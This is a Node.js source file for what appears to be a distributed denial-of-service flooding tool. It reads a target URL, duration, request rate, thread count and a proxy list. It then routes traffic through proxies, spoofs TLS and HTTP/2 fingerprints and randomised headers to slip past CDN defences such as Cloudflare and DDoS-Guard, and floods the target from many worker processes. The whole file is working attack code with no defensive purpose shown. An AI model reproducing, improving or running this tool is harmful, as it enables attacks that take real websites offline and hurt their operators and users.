const net = require("net");
const http2 = require("http2");
const http = require('http');
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const dns = require('dns');
const fetch = require('node-fetch');
const util = require('util');
const socks = require('socks').SocksClient;
const crypto = require("crypto");
const HPACK = require('hpack');
const v8 = require("v8");
const fs = require("fs");
const os = require("os");
const colors = require("colors");
const { resolve } = require("path");
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");
function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    settings.forEach(([id, value], i) => {
        data.writeUInt16BE(id, i * 6);
        data.writeUInt32BE(value, i * 6 + 2);
    });
    return data;
}

const urihost = [
    'google.com',
    'youtube.com',
    'facebook.com',
    'baidu.com',
    'wikipedia.org',
    'twitter.com',
    'amazon.com',
    'yahoo.com',
    'reddit.com',
    'netflix.com'
];
clength = urihost[Math.floor(Math.random() * urihost.length)]
function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => characters.charAt(Math.floor(Math.random() * characters.length))).join('');
  }
function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
    
  function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
  

    const cplist = [
       "TLS_AES_128_CCM_8_SHA256",
  "TLS_AES_128_CCM_SHA256",
  "TLS_CHACHA20_POLY1305_SHA256",
  "TLS_AES_256_GCM_SHA384",
  "TLS_AES_128_GCM_SHA256"
 ];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'], 
 ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 const sigalgs = [
     "ecdsa_secp256r1_sha256",
          "rsa_pss_rsae_sha256",
          "rsa_pkcs1_sha256",
          "ecdsa_secp384r1_sha384",
          "rsa_pss_rsae_sha384",
          "rsa_pkcs1_sha384",
          "rsa_pss_rsae_sha512",
          "rsa_pkcs1_sha512"
] 
  let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.SSL_OP_NO_TLSv1_3 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 if (process.argv.length < 7){console.log(`Usage: host time req thread proxy.txt `); process.exit();}
 const secureProtocol = "TLS_method";
 const headers = {};
 
 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: SignalsList,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };
 
 const secureContext = tls.createSecureContext(secureContextOptions);
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6],
 }
 

 var proxies = readLines(args.proxyFile);
 const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
 const parsedTarget = url.parse(args.target); 
 class NetSocket {
     constructor(){}
 
     async SOCKS5(options, callback) {

      const address = options.address.split(':');
      socks.createConnection({
        proxy: {
          host: options.host,
          port: options.port,
          type: 5
        },
        command: 'connect',
        destination: {
          host: address[0],
          port: +address[1]
        }
      }, (error, info) => {
        if (error) {
          return callback(undefined, error);
        } else {
          return callback(info.socket, undefined);
        }
      });
     }
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const base64Credentials = Buffer.from(`${parsedProxy[2]}:${parsedProxy[3]}`).toString('base64');
    const proxyAuthorizationHeader = `Basic ${base64Credentials}`;
     const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\n` +
     `Host: ${options.address}:443\r\n` +
     `Proxy-Connection: Keep-Alive\r\n` +
     `Proxy-Authorization: ${proxyAuthorizationHeader}\r\n\r\n`;
     
     const buffer = new Buffer.from(payload);
     const connection = net.connect({
        host: options.host,
        port: options.port,
    });

    connection.setTimeout(options.timeout * 100000);
    connection.setKeepAlive(true, 100000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}


 const Socker = new NetSocket();
 
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }


 const lookupPromise = util.promisify(dns.lookup);
let val;
let isp;
let pro;

async function getIPAndISP(url) {
    try {
        const { address } = await lookupPromise(url);
        const apiUrl = `http://ip-api.com/json/${address}`;
        const response = await fetch(apiUrl);
        if (response.ok) {
            const data = await response.json();
            isp = data.isp;
            console.log('ISP FOUND ', url, ':', isp);
        } else {
            return;
        }
    } catch (error) {
        return;
    }
}

const targetURL = parsedTarget.host;

getIPAndISP(targetURL);
const MAX_RAM_PERCENTAGE = 75;
const RESTART_DELAY = 100;

if (cluster.isMaster) {
    console.clear();
   console.log("HEAP SIZE:", v8.getHeapStatistics().heap_size_limit / (1024 * 1024));
  console.log("@CRISXTOP".bgRed);
    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };

    setInterval(handleRAMUsage, 5000);

    for (let counter = 1; counter <= args.threads; counter++) {
        
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 1); // Assuming runFlooder is defined elsewhere
}
  function runFlooder() {
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
function randstr(length) {
    const characters = "0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
};
function taoDoiTuongNgauNhien() {
    const doiTuong = {};
    function getRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }
  maxi = getRandomNumber(2,3)
    for (let i = 1; i <=maxi ; i++) {
      
      
  
   const key = 'cf-sec-'+ generateRandomString(1,9)
  
      const value =  generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)
  
      doiTuong[key] = value;
    }
  
    return doiTuong;
  }

function getWeightedRandom() {
    const randomValue = Math.random() * Math.random();
    return randomValue < 0.25;
}
const randomString = randstr(10);

        function eko(_0x386b59, _0x1cc8e4) {
            const _0x2b44d8 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
                  _0x3c9cf3 = Math.floor(Math.random() * (_0x1cc8e4 - _0x386b59 + 1)) + _0x386b59,
                  _0x4f7232 = Array.from({
              "length": _0x3c9cf3
            }, () => {
              const _0x2aa914 = Math.floor(Math.random() * _0x2b44d8.length);
          
              return _0x2b44d8[_0x2aa914];
            });
          
            return _0x4f7232.join("");
          }
          const shtty = [{
            [eko(1, 2) + "sec-fetch-site-" + eko(1, 2) + "--" + eko(2, 4)]: "-none-" + eko(1, 2) + "-" + eko(1, 2)
          }, {
            [eko(1, 2) + "sec-fetch-mode-" + eko(1, 2) + "--" + eko(2, 4)]: "-navigate-" + eko(1, 2) + "-" + eko(1, 2)
          }, {
            [eko(1, 2) + "sec-fetch-user-" + eko(1, 2) + "--" + eko(2, 4)]: "-?0-" + eko(1, 2) + "-" + eko(1, 2)
          }, {
            [eko(1, 2) + "sec-fetch-dest-" + eko(1, 2) + "--" + eko(2, 4)]: "-dynamic-" + eko(1, 2) + "-" + eko(1, 2)
          }, {
            [eko(1, 2) + "accept-encoding-" + eko(1, 2) + "--" + eko(2, 4)]: "-=noi=ne-" + eko(1, 2) + "-" + eko(1, 2)
          }, {
            [eko(1, 2) + "accept-language-" + eko(1, 2) + "--" + eko(2, 4)]: "-=none-" + eko(1, 2) + "-" + eko(1, 2)
          }]
          function randnum(_0x4c5a9b, _0x3439ec) {
            const _0x569ffc = "0123456789",
                  _0x4eb85b = Math.floor(Math.random() * (_0x3439ec - _0x4c5a9b + 1)) + _0x4c5a9b,
                  _0x1441ff = Array.from({ "length": _0x4eb85b }, () => {
                    const _0x5c8b5e = Math.floor(Math.random() * _0x569ffc.length);
                    return _0x569ffc[_0x5c8b5e];
                  });
            return _0x1441ff.join("");
          }
        
          
          const nodeii = getRandomInt(109, 124);
          const ss = getRandomInt(10, 20);
          const userAgent = Math.random() < 0.5
            ? `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${nodeii}.0.0.0 Safari/537.36`
            : `${generateRandomString(5, 7)}(Mozilla/5.0 (Windows NT ${randnum(0, 10)}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${nodeii}.0.0.0 Safari/537.36)${getRandomInt(100, 99999)}.${getRandomInt(100, 99999)}`;
          
          const skid = Math.random() < 0.5 
            ? userAgent 
            : `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_16_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${ss}.0 Safari/605.1.15`;
          const shuffleObject = (obj) => {
                const keys = Object.keys(obj);
                for (let i = keys.length - 1; i > 0; i--) {
                    const j = Math.floor(Math.random() * (i + 1));
                    [keys[i], keys[j]] = [keys[j], keys[i]];
                }
                const shuffledObj = {};
                keys.forEach(key => shuffledObj[key] = obj[key]);
                return shuffledObj;
            };
            cache = ["no-cache", "no-store", "no-transform", "only-if-cached", "max-age=0", "must-revalidate", "public", "private", "proxy-revalidate", "s-maxage=86400"];
          const crisx = {
            ...(Math.random() < 0.4 ? { "cache-control": cache } : {}),
            ...(Math.random() < 0.8 ? { "sec-ch-ua-mobile": "?0"} : {}),
            "upgrade-insecure-requests": "1",
            "Sec-Ch-Ua-Platform": "\\UnKnown\"\\",
            ...(Math.random() < 0.5 ? { "sucrisx-purpose": "prefetch" } : {}),
            ...(Math.random() < 0.5 ? { "upgrade-insecure-requests": "1" } : {}),
            ...(Math.random() < 0.2 ? {
              "sec-fetch-site": Math.random() < 0.2 ? "none;none" : "none",
              "sec-fetch-mode": Math.random() < 0.2 ? "navigate;navigation" : "navigate",
              "sec-fetch-user": Math.random() < 0.2 ? "?1;?1" : "?1"
            } : {}),
            "accept-language": "vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3",
            "sec-fetch-dest": "document",
            "accept-encoding": "gzip, deflate, br",
            ...(Math.random() < 0.3 ? shtty[Math.floor(Math.random() * shtty.length)] : {}),
            ...(Math.random() < 0.3 ? shtty[Math.floor(Math.random() * shtty.length)] : {}),
            ...(Math.random() < 0.3 ? shtty[Math.floor(Math.random() * shtty.length)] : {}),
            ...(Math.random() < 0.5 ? { ["fao-rsdy-" + generateRandomString(1, 9)]: generateRandomString(1, 10) + "-" + generateRandomString(1, 12) + "=" + generateRandomString(1, 12) } : {}),
            ...(Math.random() < 0.5 ? { ["cluster-findon--" + generateRandomString(1, 9)]: generateRandomString(1, 10) + "-" + generateRandomString(1, 12) + "=" + generateRandomString(1, 12) } : {}),
            ...(Math.random() < 0.5 ? { ["x-unknown-badsource--" + generateRandomString(1, 9)]: generateRandomString(1, 10) + "-" + generateRandomString(1, 12) + "=" + generateRandomString(1, 12) } : {}),
            ["null--kind-" + generateRandomString(1, 9)]: generateRandomString(1, 10) + "-" + generateRandomString(1, 12) + "=" + generateRandomString(1, 12)
          };
          

const author = {
    ":method": "GET",
    ":authority":Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? '.' : '') : ('www.'+ parsedTarget.host + (Math.random() < 0.5 ? '.' : '')),
    ":scheme": "https", 
    ":path": Math.random() < 1 / 100000 ? parsedTarget.path + "?search=" + generateRandomString(2, 3) + "&&lr" + generateRandomString(2, 3) : parsedTarget.path + "?search=null#" + generateRandomString(2, 3) + "&lr=" + generateRandomString(2, 3),
    ...crisx,
  };
  

const proxyOptions = {
    host: parsedProxy[0],
    port: ~~parsedProxy[1],
    address: `${parsedTarget.host}:443`,
    timeout: 10
};

Socker.HTTP(proxyOptions, async (connection, error) => {
    if (error) return;
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true);

    const settings = {
        initialWindowSize: 15663105,
    };

    const tlsOptions = {
        secure: true,
        ALPNProtocols: ["h2", "http/1.1"],
        ciphers: cipper,
        requestCert: true,
        sigalgs: sigalgs,
        socket: connection,
        ...(Math.random() < 0.5 ? {echdCurve: "X25519"} : {echdCurve: "secp256r1:X25519;"}),
        secureContext: secureContext,
        honorCipherOrder: false,
        rejectUnauthorized: false,
        secureProtocol: 'TLSv1_3_method',
        secureOptions: secureOptions,
        host: parsedTarget.host,
        servername: parsedTarget.host,
    };
    
    const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions, () => {
    tlsSocket.allowHalfOpen = true;
    tlsSocket.setNoDelay(true);
    tlsSocket.setKeepAlive(true, 60000);
    tlsSocket.setMaxListeners(0);

});

function generateJA3Fingerprint(socket) {
    const cipherInfo = socket.getCipher();
    const supportedVersions = socket.getProtocol();
  
    if (!cipherInfo) {
      console.error('Cipher info is not available. TLS handshake may not have completed.');
      return null;
    }
  
    const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
  
    const md5Hash = crypto.createHash('md5');
    md5Hash.update(ja3String);
  
    return md5Hash.digest('hex');
  }	  

let ja3Fingerprint; 
function getJA3Fingerprint() {
    return new Promise((resolve, reject) => {
        tlsSocket.on('secureConnect', () => {
            ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
            resolve(ja3Fingerprint); 
        });

        
        tlsSocket.on('error', (error) => {
            reject(error); 
        });
    });
}

async function main() {
    try {
        const fingerprint = await getJA3Fingerprint();  
        headers['ja3-fingerprint']= fingerprint  
    } catch (error) {
        
    }
}


main();
    function getSettingsBasedOnISP(isp) {
        const defaultSettings = {
            headerTableSize: 65536,
            initialWindowSize: Math.random() < 0.5 ? 6291456: 33554432,
            maxHeaderListSize: 262144,
            enablePush: false,
            maxConcurrentStreams: Math.random() < 0.5 ? 100 : 1000,
            maxFrameSize: 16384,
            enableConnectProtocol: false,
        };
    
        const settings = { ...defaultSettings };
    
        switch (isp) {
        case 'Cloudflare, Inc.':
            settings.priority = 1;
            settings.headerTableSize = 65536;
            settings.maxConcurrentStreams = 1000;
            settings.initialWindowSize = 6291456;
            settings.maxFrameSize = 16384;
            settings.enableConnectProtocol= false;
            break;
        case 'FDCservers.net':
        case 'OVH SAS':
        case 'VNXCLOUD':
            settings.priority = 0;
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 65536;
            settings.maxFrameSize = 16777215;
            settings.maxConcurrentStreams = 128;
            settings.maxHeaderListSize = 4294967295;
            break;
        case 'Akamai Technologies, Inc.':
        case 'Akamai International B.V.':
            settings.priority = 1;
            settings.headerTableSize = 65536;
            settings.maxConcurrentStreams = 1000;
            settings.initialWindowSize = 6291456;
            settings.maxFrameSize = 16384;
            settings.maxHeaderListSize = 32768;
            break;
        case 'Fastly, Inc.':
        case 'Optitrust GmbH':
            settings.priority = 0;
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 65535;
            settings.maxFrameSize = 16384;
            settings.maxConcurrentStreams = 100;
            settings.maxHeaderListSize = 4294967295;
            break;
        case 'Ddos-guard LTD':
            settings.priority = 1;
            settings.maxConcurrentStreams = 1000;
            settings.initialWindowSize = 65535;
            settings.maxFrameSize = 16777215;
            settings.maxHeaderListSize = 262144;
            settings.enablePush = false; 
            break;
        case 'Amazon.com, Inc.':
        case 'Amazon Technologies Inc.':
            settings.priority = 0;
            settings.maxConcurrentStreams = 100;
            settings.initialWindowSize = 65535;
            settings.maxHeaderListSize = 262144;
            break;
        case 'Microsoft Corporation':
        case 'Vietnam Posts and Telecommunications Group':
        case 'VIETNIX':
            settings.priority = 0;
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 8388608;
            settings.maxFrameSize = 16384;
            settings.maxConcurrentStreams = 100;
            settings.maxHeaderListSize = 4294967295;
            break;
        case 'Google LLC':
            settings.priority = 0;
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 1048576;
            settings.maxFrameSize = 16384;
            settings.maxConcurrentStreams = 100;
            settings.maxHeaderListSize = 137216;
            break;
        default:
            settings.headerTableSize = 65535;
            settings.maxConcurrentStreams = 1000;
            settings.initialWindowSize = 6291456;
            settings.maxHeaderListSize = 261144;
            settings.maxFrameSize = 16384;
            settings.enablePush = false;
            break;
    }

    return settings;
}
    
    let hpack = new HPACK();
    let client;
    
    const clients = [];
    client = http2.connect(parsedTarget.href, {
        protocol: "https",
        createConnection: () => tlsSocket,
        "unknownProtocolTimeout": 5,
        "maxReservedRemoteStreams": 10000,
        "maxSessionMemory": 4 * 1024 * 1024 * 1024,
        settings : getSettingsBasedOnISP(isp),
        socket: tlsSocket,
    });
    clients.push(client);
    client.setMaxListeners(0);
    const updateWindow = Buffer.alloc(4);
    updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105, 0);
    client.on('remoteSettings', (settings) => {
        const localWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105;
        client.setLocalWindowSize(localWindowSize, 0);
    });
    
    client.on('connect', () => {
    client.ping((err, duration, payload) => {
        client.destroy()
    });

    client.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('NATRAL'));

});
    clients.forEach(client => {
    const intervalId = setInterval(() => {
        async function sendRequests() {
            const randomItem = (array) => array[Math.floor(Math.random() * array.length)];
            const dynHeaders = {
            "user-agent" :skid,
                ...author,
            };

            const packed = Buffer.concat([
                Buffer.from([0x80, 0, 0, 0, 0xFF]),
                hpack.encode(dynHeaders)
            ]);

            const streamId = 1;
            const requests = [];
            let count = 0;

            const increaseRequestRate = async (client, dynHeaders, args) => {
                if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
                    for (let i = 0; i < args.Rate ; i++) {
                        const requestPromise = new Promise((resolve, reject) => {
                            const req = client.request(dynHeaders, {
                                weight: Math.random() < 0.5 ? 251 : 231,
                                depends_on: 0,
                                exclusive: Math.random() < 0.5 ? true : false,
                            })
                            .on('response', response => {
                                req.close(http2.constants.NO_ERROR);
                                req.destroy();
                                resolve();
                            });
                            req.on('end', () => {
                                count++;
                                if (count === args.time * args.Rate) {
                                    clearInterval(intervalId);
                                    client.close(http2.constants.NGHTTP2_CANCEL);
                                }
                                reject(new Error('Request timed out'));
                            });

                            req.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
                        });

                        const frame = encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20);
                        requests.push({ requestPromise, frame });
                    }

                    await Promise.all(requests.map(({ requestPromise }) => requestPromise));
                }
            }

            await increaseRequestRate(client, dynHeaders, args);
        }
            sendRequests();
    }, 500);
});

    
        client.on("close", () => {
            client.destroy();
            tlsSocket.destroy();
            connection.destroy();
            return runFlooder();
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return runFlooder();
        });
        });
    }
const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});

